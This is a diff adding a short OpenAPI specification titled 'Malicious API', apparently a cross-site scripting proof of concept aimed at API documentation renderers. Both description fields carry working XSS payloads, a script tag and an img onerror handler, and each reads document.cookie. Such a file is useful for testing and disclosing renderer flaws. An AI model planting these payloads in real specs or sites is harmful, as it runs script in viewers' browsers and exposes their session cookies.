@@ -1,0 +1,17 @@
+openapi: "3.0.0"
+info:
+  title: "Malicious API"
+  version: "1.0"
+  description: |
+    <script>
+      alert("XSS Success! Your cookies: " + document.cookie);
+    </script>
+paths:
+  /test:
+    get:
+      summary: "XSS PoC"
+      description: |
+        <img src="x" onerror="alert(document.cookie)">
+      responses:
+        "200":
+          description: "OK"
